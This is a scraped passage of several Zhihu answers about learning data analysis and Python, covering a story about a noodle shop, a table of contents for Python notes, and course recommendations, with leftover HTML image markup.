data-original=\"https://pic2.zhimg.com/v2-e1e14ef41ed11863f0694d1007397a0d_r.jpg\"&gt;一开始我是无语，后来想了想，这应该是一个普遍问题这就是数据分析中最大问题，很多人学习数据分析，更多的是为了数据分析而数据分析，实际上根本不知道自己在做什么，为什么这么做。或者仅仅是为了在简历上增加一行鄙人精通数据分析。估计HR看了是要微笑着，然后把简历放入不予录用的文件夹中。数据分析，不论使用什么样的工具，使用什么样的方法，不论是Excel，还是Python，还是MySQL，都是工具，目的只有一个——解决一个问题，或者给一个决策提供依据。所以，学习数据分析的第一步，是要考虑，我要用数据，解决一个什么样的问题？这点如果没有考虑清楚，只是跟着网上的教程学习爬虫，学习数据清洗，然后把那些公有的统计数据做成绚烂的图表，又有什么用呢？1.哪里开店比如，有这样一个现实的例子，你表嫂跟你说，小明啊，你最喜欢吃我煮的麻辣烫了，我想开麻辣烫店，就在大学城附近，你说哪里好呢？你是不是会想到以下几个问题呢?表嫂的麻辣烫真好吃，想想就流下了口水&lt;img src=\"https://pic2.zhimg.com/v2-2c78ffbf0db057f4b7f2cbf13ae2105d_b.png\" data-rawwidth=\"600\" data-rawheight=\"388\" class=\"origin_image zh-lightbox-thumb\" width=\"600\" data-original=\"https://pic2.zhimg.com/v2-2c78ffbf0db057f4b7f2cbf13ae2105d_r.jpg\"&gt;咳咳，正事要紧，到底应该在哪里开店呢？所以，你有考虑到了这些可以量化的数据并且对应的你找到了这些数据的获取方式&lt;img src=\"https://pic2.zhimg.com/v2-8c4bb5fa68b8097a606e3ab8522f43e5_b.png\" data-rawwidth=\"1736\" data-rawheight=\"512\" class=\"origin_image zh-lightbox-thumb\" width=\"1736\" data-original=\"https://pic2.zhimg.com/v2-8c4bb5fa68b8097a606e3ab8522f43e5_r.jpg\"&gt;问题来了，虽然写出来了大致的数据获取方式，但是具体怎么操作？招生计划怎么获得，学校官网还是相关报道？如何通过在线地图分析学校面积及相关建筑分布的合理性，最小路径还是顺路路径？如何获学校食堂评价，爬取微博数据，获得地理位置，并且对提及“食堂”的微博进行词义褒贬分析？或者直接拦路问询？人流量怎么获得，实地考察的时候，用本子画正字吗？很好，这些问题你都想到了相应的解决方式，并且很顺利的获得这些数据，尽管有可能不太准确，但是你确确实实比以前更加了解了大学城附近大致的餐饮市场环境，不是么？这也就是，数据分析必须紧贴业务本身获得数据之后，如何分析，人流量/商贩个数？但是每个商贩的服务能力又不一样，是不是得加权，如何加权？于是你考虑了很多情况，写下来一个公式：建议推荐开店系数=（人流量*XX/(YY*0.4)+租金*0.5）/ZZ根据系数，你得出一个结论，建议开店的位置的前三家分别是A大东门A大小西门B大女生宿舍小南门你表嫂想了下，说，我知道你最喜欢B大的小姑娘们，胸大貌美腿子长。于是麻辣烫店就开在了B大女生宿舍的小南门。这个过程中，你有可能学会的或者仅仅了解（不一定掌握）数据分析的相关技能包括不限于以下：Excel加减乘除，基础函数；爬虫的基本原理，及操作方式；正则表达式与数据清洗；语义分析的一般实现方式；在线地图API可以获取的数据有哪些；2.优化数据的应用一阵时间的忙碌，店终于开起来了，你表嫂的手艺真的很不错，每天都有很多小姑娘过来吃麻辣烫，中午晚上的时候，都忙不过来。你表嫂感觉很可惜，很多客户就这样被浪费掉了：我多卖一份，少卖一份都无所谓，但是小姑娘本来想吃咱们家的麻辣烫，结果爬不上队饿着肚子走掉了，到别家说不定还要等，看见我都觉得挺过意不去的。这时候聪明的你，有可能想到了通过获取以下数据，并且进行相关的分析来优化当前这个问题&lt;img src=\"https://pic1.zhimg.com/v2-6fa11bced9d33416fe0209f1a6d3b09c_b.png\" data-rawwidth=\"1254\" data-rawheight=\"534\" class=\"origin_image zh-lightbox-thumb\" width=\"1254\" data-original=\"https://pic1.zhimg.com/v2-6fa11bced9d33416fe0209f1a6d3b09c_r.jpg\"&gt;你连续跟踪了三天这样的数据，运用了相关的统计学的相关知识等待时间&gt;=13分钟的时候，用户放弃继续等待的概率是78%！，然后你表嫂并不能理解，这78%到底是什么意思所以你画了一张图，说山峰越高，走的人就越多。&lt;img src=\"https://pic4.zhimg.com/v2-b88c2078505af861b390318db487a1b3_b.png\" data-rawwidth=\"1156\" data-rawheight=\"834\" class=\"origin_image zh-lightbox-thumb\" width=\"1156\" data-original=\"https://pic4.zhimg.com/v2-b88c2078505af861b390318db487a1b3_r.jpg\"&gt;问题找到了，只要将最长等待时间优化到13分钟之内，用户放弃等待的几率有可能下降。这时候聪明的你，想到了如下的解决方式：用户抵店之后，才开始点餐，然后烹饪，是不是可以通过互联网的方式进行预点餐呢，所以你给表嫂申请了一个微信号，日经贴就是：“今天你想吃什么”，回复留言及预计到店时间，即可预订。你发现，用户选完菜之后总是喜欢把菜夹放到最远的地方，每次表嫂都需要把菜夹整理一次，拿到开始的地方。你考虑了一下，将菜筐的布局进行更改，刚好菜夹能够完成一次循环；或者你使用专菜专夹的方式。优化了店内桌椅布局，行走了最短的距离到达全店……数据分析必须落地才是有效的，不是提交统计结果，而且获得统计结论这个过程中，你有可能学会的或者仅仅了解（不一定掌握）数据分析的相关技能包括不限于以下：数据清洗的一般方式，时间函数计算统计学中分布的相关知识，这里应该是泊松分布数据可视化，包括不限于Excel 图表，js图表库，或者在线图表工具3.大数据的处理生意越做越大，扩充了店面之后，又开了分店，这时候你表嫂已经不亲自上一线熬煮麻辣烫了，但是又不放心那些雇来的人是否认真的在服务，于是制定了相应的店规，动不动还来一个突击检查。感觉比以前还要累了。这时候，聪明的你，看在眼里，疼在心里，所以，你建议嫂嫂购买专业的餐饮管理软件，来获得相应的店铺运营数据。在餐饮软件的后台，会有这么些个大致的运营数据，当前订单量，成交量，客流量，客单价，等等等等，一切看起来那么完美。等等，不对，为什么这个月以来，C分店的客单价总是这么低呢？事出有异，必定有妖！还好，这个系统功能还算完善，能够导出一天所有的订单明细，包含以下字段，下单时间，下单菜品，下单客户，联系电话，消费金额，配餐人，操作人，收银员，等等等但是，你还是快掀桌子了，一个月，让我导出30次数据，然后在合并么？这个方法简直太土鳖了你想着，要是能直接读取数据库不就好了么？一看产品介绍，数据库使用MySQL，于是你Google了一下，SQL入门，你发现，WHERE 和SELECT 基本上都满足你的需求了很顺利的，你把这些数据导出了。你把这个20W条记录的CSV用Excel打开，风扇疯狂的转了起来，不一会，你表嫂孱弱的笔记本就卡死了。你感叹，Excel分析小一点的数据还行，数据量稍微大点，就显得力不从心。所以，你拿起了一本书，名字叫《21天学习Python，从入门到放弃》，这不坑爹呢吗？你想着，反正我是为了处理这批很大的数据，没必要全部了解Python的功能，只需要找到相关的操作方法就好了。你在Google上分别搜索了以下关键字Python mysqlPython 数据分析库你还找到了一本，用Python进行数据分析的pdf，感觉这本书写的通俗易懂，而且还有元数据示例。在搜索的过程中，你发现了有好多数据分析是代码示例，有的甚至，只需要改一下文件路径，搬过来就能用。你会感叹，原来，写程序也是Ctrl+C,Ctrl+V啊这个过程中，你有可能学会的或者仅仅了解（不一定掌握）数据分析的相关技能包括不限于以下：SQL基础语句Python常见的数据分析库Python数据可视化聪明的你，捣鼓了三两天，就发现了问题的所在？那么问题究竟在哪呢我实在是写不动了，明天再更相关Live* 培养数据分析的思维方式相关回答* 怎么培养数据分析的能力？ - 知乎* 业余时间如何学数据分析？ - 知乎* 零基础如何学爬虫技术？ - 知乎* 如何用一个循环语句输出九九乘法表？ - 知乎* Excel 有什么神奇用途？ - 知乎-------分割线-------\n欢迎关注我的微信公众账号：决明子 Jueming_zi\n这里有关于摄影，绘画，艺术，以及我想说给你们听的故事http://weixin.qq.com/r/iUgiOm3EeDAHrSlZ9x2b (二维码自动识别)", "praise_num": 3370, "answer_object_id": "a35145c81f8e7e6e88a14a9907c8d64b"},{"answer_url": "https://www.zhihu.com/question/29138020/answer/81972368", "answer_id": 81972368, "comments_num": 370, "answer_article": "基于这个笔记的实体书了解一下？书名叫《自学Python——编程基础科学计算及数据分析》，将笔记的内容进行了系统整理，并补充了一些基础知识，可以对照两边的目录看差异。基于2.7。京东有自营。Python 其实挺简单的，也挺强大的。我用 Python 做科学计算，自学一年，也记了一年的笔记。笔记链接（基于Python 2.7）：Github：lijin-THU/notes-pythonNbviewer：Jupyter Notebook Viewer网页：lijin-thu.github.io 笔记目录：01. Python 工具01.01 Python 简介01.02 Ipython 解释器01.03 Ipython notebook01.04 使用 Anaconda02. Python 基础02.01 Python 入门演示02.02 Python 数据类型02.03 数字02.04 字符串02.05 索引和分片02.06 列表02.07 可变和不可变类型02.08 元组02.09 列表与元组的速度比较02.10 字典02.11 集合02.12 不可变集合02.13 Python 赋值机制02.14 判断语句02.15 循环02.16 列表推导式02.17 函数02.18 模块和包02.19 异常02.20 警告02.21 文件读写03. Numpy03.01 Numpy 简介03.02 Matplotlib 基础03.03 Numpy 数组及其索引03.04 数组类型03.05 数组方法03.06 数组排序03.07 数组形状03.08 对角线03.09 数组与字符串的转换03.10 数组属性方法总结03.11 生成数组的函数03.12 矩阵03.13 一般函数03.14 向量化函数03.15 二元运算03.16 ufunc 对象03.17 choose 函数实现条件筛选03.18 数组广播机制03.19 数组读写03.20 结构化数组03.21 记录数组03.22 内存映射03.23 从 Matlab 到 Numpy04. Scipy04.01 SCIentific PYthon 简介04.02 插值04.03 概率统计方法04.04 曲线拟合04.05 最小化函数04.06 积分04.07 解微分方程04.08 稀疏矩阵04.09 线性代数04.10 稀疏矩阵的线性代数05. Python 进阶05.01 sys 模块简介05.02 与操作系统进行交互：os 模块05.03 CSV 文件和 csv 模块05.04 正则表达式和 re 模块05.05 datetime 模块05.06 SQL 数据库05.07 对象关系映射05.08 函数进阶：参数传递，高阶函数，lambda 匿名函数，global 变量，递归05.09 迭代器05.10 生成器05.11 with 语句和上下文管理器05.12 修饰符05.13 修饰符的使用05.14 operator, functools, itertools, toolz, fn, funcy 模块05.15 作用域05.16 动态编译06. Matplotlib06.01 Pyplot 教程06.02 使用 style 来配置 pyplot 风格06.03 处理文本（基础）06.04 处理文本（数学表达式）06.05 图像基础06.06 注释06.07 标签06.08 figures, subplots, axes 和 ticks 对象06.09 不要迷信默认设置06.10 各种绘图实例07. 使用其他语言进行扩展07.01 简介07.02 Python 扩展模块07.03 Cython：Cython 基础，将源代码转换成扩展模块07.04 Cython：Cython 语法，调用其他C库07.05 Cython：class 和 cdef class，使用 C++07.06 Cython：Typed memoryviews07.07 生成编译注释07.08 ctypes08. 面向对象编程08.01 简介08.02 使用 OOP 对森林火灾建模08.03 什么是对象？08.04 定义 class08.05 特殊方法08.06 属性08.07 森林火灾模拟08.08 继承08.09 super() 函数08.10 重定义森林火灾模拟08.11 接口08.12 共有，私有和特殊方法和属性08.13 多重继承09. Theano 基础09.01 Theano 简介及其安装09.02 Theano 基础09.03 Theano 在 Windows 上的配置09.04 Theano 符号图结构09.05 Theano 配置和编译模式09.06 Theano 条件语句09.07 Theano 循环：scan（详解）09.08 Theano 实例：线性回归09.09 Theano 实例：Logistic 回归09.10 Theano 实例：Softmax 回归09.11 Theano 实例：人工神经网络09.12 Theano 随机数流变量09.13 Theano 实例：更复杂的网络09.14 Theano 实例：卷积神经网络09.15 Theano tensor 模块：基础09.16 Theano tensor 模块：索引09.17 Theano tensor 模块：操作符和逐元素操作09.18 Theano tensor 模块：nnet 子模块09.19 Theano tensor 模块：conv 子模块10. 有趣的第三方模块10.01 使用 basemap 画地图10.02 使用 cartopy 画地图10.03 探索 NBA 数据10.04 金庸的武侠世界11. 有用的工具11.01 pprint 模块：打印 Python 对象11.02 pickle, cPickle 模块：序列化 Python 对象11.03 json 模块：处理 JSON 数据11.04 glob 模块：文件模式匹配11.05 shutil 模块：高级文件操作11.06 gzip, zipfile, tarfile 模块：处理压缩文件11.07 logging 模块：记录日志11.08 string 模块：字符串处理11.09 collections 模块：更多数据结构11.10 requests 模块：HTTP for Human12. Pandas12.01 十分钟上手 Pandas12.02 一维数据结构：Series12.03 二维数据结构：DataFrame", "praise_num": 14066, "answer_object_id": "3cead32b9947acb356f273b9be396b6e"},{"answer_url": "https://www.zhihu.com/question/29138020/answer/428156754", "answer_id": 428156754, "comments_num": 78, "answer_article": "如果你一直想学Python，但是不知道如何入手，那就别犹豫了。这篇文章就是为你写的。&lt;img src=\"https://pic3.zhimg.com/v2-1f8fa0d63c655bb201f1a691a6dcd316_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"422\" data-default-watermark-src=\"https://pic3.zhimg.com/v2-6283f9d4996f9e54434547d5e8334e62_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"750\" data-original=\"https://pic3.zhimg.com/v2-1f8fa0d63c655bb201f1a691a6dcd316_r.jpg\"&gt;疑问随着数据科学概念的普及，Python这门并不算新的语言火得一塌糊涂。因为写了几篇用Python做数据分析的文章，经常有读者和学生在留言区问我，想学习Python，该如何入手？我经常需要根据他们的不同情况，提出对应的建议。这样针对性虽强，但效率不高。这个问题，我还是写出来，让更多的人一同看到吧。有几位出版社的编辑，给我发私信，鼓励我赶紧写一本Python教材出来。我暂时还没有写Python基础教程的计划。因为在我看来，现有的学习资源已经足够好了。有现成的资源和路径，为什么许多人依然在为学Python犯愁呢？因为学习有个效率问题。Python语法清晰明快，简单易学。这是Python如此普及的重要原因。但是，选择合适的Python学习方式，需要跟你自身的特性相结合。人群划分的标准是什么？不是你是否计算机相关专业，也不是你是否已经工作，而是一个重要的指标——你的自律能力。你可能觉得我说的话没有信息含量。自律能力强，学得更好，地球人谁不知道？可是，自律不够强的人，难道就注定什么也不能学了？当然不是。每个人的性格都有不同的特点，没有绝对的高下之分。不信你听听刘宝瑞先生的相声《日遭三险》，就明白了。&lt;img src=\"https://pic3.zhimg.com/v2-57c9cd9926ebc9ad5e901f9d15d7919a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"480\" data-rawheight=\"360\" data-default-watermark-src=\"https://pic2.zhimg.com/v2-ec3ddaac80f94b7b2ac7694c3080e64d_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"480\" data-original=\"https://pic3.zhimg.com/v2-57c9cd9926ebc9ad5e901f9d15d7919a_r.jpg\"&gt;自律能力也是这样。只要你能清楚认识自己，就能以更高效的方法来学习新知识和技能。下面我们分类探讨一下，不同自律能力的人，该如何学Python，才能更高效。路径I咱们先从自律能力最差的人说起。这样的同学，往往是三分钟热度。偶然受到了刺激，发奋要学习Python，以便投入数据科学的事业中。他会立即跑到图书馆或者书店抱回来一本《X天从入门到精通Python》的书开始啃。结果X天还没到，就顺利跑完了从入门到放弃的全过程。你没能坚持下来，自己肯定是有责任的。但是最大的问题，在于过度高估自己的自律能力。这样的同学，我推荐你到Coursera平台上，按部就班学习一门非常好的MOOC——“Programming for Everybody”。&lt;img src=\"https://pic1.zhimg.com/v2-e92986c72c1f883654ea8305a8062ea0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"698\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-281d703529b1f9e732b1abbda0eabedc_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-e92986c72c1f883654ea8305a8062ea0_r.jpg\"&gt;推荐这门课，是因为课程质量真是太好了。首先是教材好。这本教材的来源是有故事的。先是 Allen B. Downey 写了一本开放书籍 “Think Python: How to Think like a Computer Scientist”。&lt;img src=\"https://pic4.zhimg.com/v2-4a272a4052e5b88542f993749ce92947_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"1627\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-cd01422a0daffd9b93f30532524cb3e0_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic4.zhimg.com/v2-4a272a4052e5b88542f993749ce92947_r.jpg\"&gt;这本书在Amazon上的评价是这样的：&lt;img src=\"https://pic1.zhimg.com/v2-7239beabb83c519567d50696dd501bfc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1070\" data-rawheight=\"543\" data-default-watermark-src=\"https://pic2.zhimg.com/v2-1188056834a477bc5767cb729a4ab315_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1070\" data-original=\"https://pic1.zhimg.com/v2-7239beabb83c519567d50696dd501bfc_r.jpg\"&gt;Charles Severance觉得这本书写得太好了，想把它作为教材。于是征得作者同意，大篇幅借鉴了这本书的内容架构，编写了一本 “Python for Informatics”。&lt;img src=\"https://pic3.zhimg.com/v2-8010603ed2e99b115396d0931a79f282_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"522\" data-rawheight=\"735\" data-default-watermark-src=\"https://pic4.zhimg.com/v2-137f59ace3f554bf50c38eef00c0ee5b_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"522\" data-original=\"https://pic3.zhimg.com/v2-8010603ed2e99b115396d0931a79f282_r.jpg\"&gt;Charles写作这本书的时候，同时开放推出了iBook格式。里面就包含了自己的授课视频，供学生直接观看学习。&lt;img src=\"https://pic3.zhimg.com/v2-df0b9f0d509e14f451881000051a5a12_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"508\" data-default-watermark-src=\"https://pic2.zhimg.com/v2-facd534b10b3303d9cbbddf840e414f5_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic3.zhimg.com/v2-df0b9f0d509e14f451881000051a5a12_r.jpg\"&gt;后来，Charles用这本书扩展，做成了一门MOOC。2015年上线不久，硅谷资深工程师就都争相学习。Charles深谙课程迭代的技艺。他不断添加内容，完善课程体系，将一门课发展成一个专项课程(Signature Track)，并且将教材升级为 “Python for Everybody: Exploring Data In Python 3”&lt;img src=\"https://pic3.zhimg.com/v2-07e7940d3fc46f4e094262a5c1f1812e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"1767\" data-default-watermark-src=\"https://pic2.zhimg.com/v2-9dea9cc94273cc2ed6e3fbe384e82b91_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic3.zhimg.com/v2-07e7940d3fc46f4e094262a5c1f1812e_r.jpg\"&gt;在目前全球MOOC口碑榜上，Charles的这门课一直名列前茅。&lt;img src=\"https://pic3.zhimg.com/v2-a9d39efeceacfd668e7bac0759eed28e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"887\" data-rawheight=\"130\" class=\"origin_image zh-lightbox-thumb\" width=\"887\" data-original=\"https://pic3.zhimg.com/v2-a9d39efeceacfd668e7bac0759eed28e_r.jpg\"&gt;这个专项课程深入浅出讲解Python本来就很简单的语法，而且还用数据科学的一些基础工作任务，带动你去使用Python语言写简单项目。这种扎实的训练过程可以增强你的信心，激发兴趣。对于自律程度低的同学来说，下面这个特性更重要——一切工作都有时限。Coursera上的课程，每周的任务很明确。练习题正确率如果不能达到80%，就不能过关。到了截止日期，如果你不能完成全部练习和课程项目，就拿不到证书。&lt;img src=\"https://pic4.zhimg.com/v2-4d088b454191767d083df89cc2c21d63_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"958\" data-default-watermark-src=\"https://pic4.zhimg.com/v2-2c5bbd325d17d8a3b76d91e841fe06df_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic4.zhimg.com/v2-4d088b454191767d083df89cc2c21d63_r.jpg\"&gt;老师在前面引领你，助教在旁边督促你，平台用时间表提醒你，论坛上的同学们在用同侪压力推挤你……想偷懒？想三天打鱼两天晒网？很难。路径II如果你的自律能力中等偏上，那么你可以选择的面就宽了。这里我给你推荐另一个MOOC平台，叫做Datacamp。&lt;img src=\"https://pic3.zhimg.com/v2-20b8652fb6ec212e3a9a8f892f28eb4a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"698\" data-default-watermark-src=\"https://pic3.zhimg.com/v2-dedce89e070f4b58673d16838e667506_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic3.zhimg.com/v2-20b8652fb6ec212e3a9a8f892f28eb4a_r.jpg\"&gt;我第一次接触Datacamp，是在2015年初。那时我在Coursera上选修杜克大学的统计学课程 “Statistical Inference”，配套的练习就在Datacamp上。当时这个平台就给我留下了非常深刻的印象，因为代码的运行都采用了云环境。学习者不需要在本机安装任何环境，一个支持HTML5标准的浏览器就能带给你完整的学习体验。对初学者来说，这种入门方式太好了。要知道，许多人的学习热情，就是被环境配置和依赖软件包安装的坑埋掉的。两年之后，Datacamp已经迭代得更为强大。你可以打开首页的Data Scientist with Python这个学习路径，查看其中已经提供的20门课程。&lt;img src=\"https://pic4.zhimg.com/v2-8c1c465991a4e3a502489cc385e828e7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"698\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-0d06a165f915003c3e5fbc3d1eacb02c_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic4.zhimg.com/v2-8c1c465991a4e3a502489cc385e828e7_r.jpg\"&gt;这些课程涵盖了从Python基础，到数据处理，直至人工智能和深度神经网络的方方面面。&lt;img src=\"https://pic1.zhimg.com/v2-23a769eaec6aa53c98b947361863fa3c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"698\" data-default-watermark-src=\"https://pic4.zhimg.com/v2-9b5a6278fcb2fc838bd6626ddaed55cb_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-23a769eaec6aa53c98b947361863fa3c_r.jpg\"&gt;所有的课程设计，都是短小精悍的。一般不超过4个小时，就可以完成某一主题的学习。这样你学起来毫不费力，可以在相当短的时间内获得反馈（练习题自动评分）和成就感（证书）。这个平台的课程，进度完全由学习者自己掌控。所以我把它归纳为适合有一定自律能力的学习者。它既可以给你即时的回馈，让你时刻了解自己所处的位置进度，不会迷失方向，又能充分体验自主学习的乐趣。Datacamp的课程，一般都是第一部分免费开放。后面部分购买后才能解锁学习。如果你对自己的学习能力和毅力有信心，可以购买一个完整时间段（例如一年）的课程。在此期间，所有平台上的课程，你都可以学习，并且可以在通过后获取证书。这样的购买方案本身已经有优惠，而且每年都会有特定时段的大幅打折促销，非常划算。建议放到购物车里面多关注。&lt;img src=\"https://pic1.zhimg.com/v2-2a1e2b9ef3647ce55dba3c7add2c1be4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"858\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-c6cf71383a557fbb3b38a9f90df73154_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-2a1e2b9ef3647ce55dba3c7add2c1be4_r.jpg\"&gt;这是我在Datacamp拿到的深度学习框架Keras课程证书。确实只需要几个小时的时间就能学完。成就感还是蛮强的。路径III前面提到的课程费用不菲。Coursera上每门课平均价格在49美元左右。对来自发展中国家的学生群体，Coursera可以提供助学金。你可以根据自己的需求如实填写申请表，来获得资助。对于自律能力强的同学来说，你的选择可以变得非常简单直接——可以用最受推崇的教材，自己看书学习。最受推崇的教材，其实是没有的。正如西谚有云： One man’s meat, is another man’s poison.这个世界上，就没有哪件东西大家都说好。但口碑非常好的教材是存在的，例如这本起了个怪名字的《笨办法学Python》(Learn Python the Hard Way)。&lt;img src=\"https://pic4.zhimg.com/v2-994066342a47405ec4543c3145dbea4b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"782\" data-default-watermark-src=\"https://pic2.zhimg.com/v2-940977fa21c50f377e140af9914b86c5_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"600\" data-original=\"https://pic4.zhimg.com/v2-994066342a47405ec4543c3145dbea4b_r.jpg\"&gt;千万不要被名称迷惑，望文生义觉得这是一本糟糕的Python入门教程。恰恰相反，这本书的设计，非常适合人们的认知规律。我们学东西，由浅入深，由易到难，逐步递进。如果一味追求新知，那么之前学的东西会很快遗忘。如果总是原地打转，会带来枯燥和无聊的感觉。还记得高三做的那一年卷子吧？好的教科书，应该在每一个章节给学习者提供新的知识和内容，提出足够的挑战。但是挑战性不能高到让学习者产生挫败感而放弃。同时也不能忽视在后续内容中把前面所学知识改换面目不断螺旋上升式重复出现。只有这样才能巩固所学，让学习者感受到基础知识的作用，增强学习的愉悦感。这么说有些抽象，实际上有一本英语教材非常符合上述认知规律。就是我在课堂上和文章里反复推荐过的这一套教材：&lt;img src=\"https://pic3.zhimg.com/v2-60e5c4659a701db97ca0d219ec0daf1e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"450\" data-rawheight=\"267\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-4ab9ef65bcebf922cd7d125ea9b7f758_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"450\" data-original=\"https://pic3.zhimg.com/v2-60e5c4659a701db97ca0d219ec0daf1e_r.jpg\"&gt;《笨办法学Python》也是一本这样的书。你需要做的就是把书打开，同时打开一个好用的代码编辑器，开始按书中要求敲代码、运行代码、改代码……下图是我当初学习时，照着这本书敲的代码。&lt;img src=\"https://pic4.zhimg.com/v2-a5c15ad2ad58154d52e32351313fdea7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"718\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-3961a4625b69b96b4cbf9e9e98a2850c_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic4.zhimg.com/v2-a5c15ad2ad58154d52e32351313fdea7_r.jpg\"&gt;书中对Python基础内容训练的完备性，至今无出其右者。顺便说一句，这本书有中文版哦。所以如果你英语不好，完全不用担心。嘱咐一句，英语真该好好学。拓宽的不仅是你的眼界，也增加了你可能获得的机会。考虑到仔细阅读这部分的读者都是自律性很强的人，我就不用多说了。挑战三条基本的Python入门路径讲完了。通过对自己自律能力的清晰理解，相信你可以找到一种适合自己逐渐学习和掌握Python的方式。但是完成了读书和听课，是不是就完事大吉了？当然不是。许多人在这里犯了错误。他们以为拿到了证书，或学完了教材，就算是真正掌握了Python。然后把这门语言丢弃在一旁，去刷美剧和小说了。相信我，你会遗忘的。如果你对于长期不接触的东西从不遗忘……去医院检查一下吧。大部分人的记忆模式，都是这个样子的：&lt;img src=\"https://pic3.zhimg.com/v2-f1034d7fbfc65e1951745f8a45da1ef2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"674\" data-default-watermark-src=\"https://pic1.zhimg.com/v2-77683f7c6f65bb5ba629b34e7074a060_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic3.zhimg.com/v2-f1034d7fbfc65e1951745f8a45da1ef2_r.jpg\"&gt;若不加以干涉，不出一个星期，你就能把学到的新知识几乎忘光。如果你不希望自己辛苦学来的Python知识被如此轻易浪费掉，怎么办？实践你应该实践。实践Python技能，未必一定要找个世界500强企业的核心技术部门，“996”工作N年才能完成。你可以从生活中寻找各种有趣的问题，然后思考能否用Python编程来解决它。我真正觉得自己初步掌握了Python，就是在完成了我的第一个github项目之后。项目非常简单，就是用Python作为胶水语言，把一系列工具连接在一起。可以把Markdown撰写的内容随心所欲一键变化成各种格式。格式包括而不限于：PDF/LaTeX;Word;Bitcron文稿;MarkEditor文稿；MWeb文稿；Bear文稿；TextBundle（可以导入MindNode, Ulysses等）;Reveal.js幻灯;发布版本Markdown（图片一键至七牛图床）;本地版本Markdown（简书等远程Markdown同步图片至本地)；Day One日记。其中部分功能我正陆续发布在github公开项目中，地址在这里。相应地，我也撰文做了介绍。&lt;img src=\"https://pic1.zhimg.com/v2-f05412bdd8ded40a8ac091094a4664c8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"698\" data-default-watermark-src=\"https://pic3.zhimg.com/v2-1fd0d55755fd4c29a01b88be486b1b0a_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" data-original=\"https://pic1.zhimg.com/v2-f05412bdd8ded40a8ac091094a4664c8_r.jpg\"&gt;这个小项目，我从2014年开始做。实话实说，现在回头看当时的代码，简直惨不忍睹。但是如果你逐渐对自己的代码有了这种感觉，证明你在进步。不要指望自己一出手就能写出完美的代码，要把“迭代”两个字时刻装在心里。这样你才能容忍自己的笨拙，不断提高。正如古人说的那句： 勤学似春起之苗，不见其增，而日有所长。我在做这个项目的过程中，曾经遇到了中文编码、隐私信息存储、文件名空格处理、绝对与相对路径、发布流程划分、功能解耦合、Web图片地址附带参数……等等一系列的问题。&lt;img src=\"https://pic3.zhimg.com/v2-4e64f07e6430ae1c59feca04d38055b2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1240\" data-rawheight=\"783\" data-default-watermark-src=\"https://pic4.zhimg.com/v2-28b2e82e8e33d1fb2b3978fd5c80e773_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1240\" 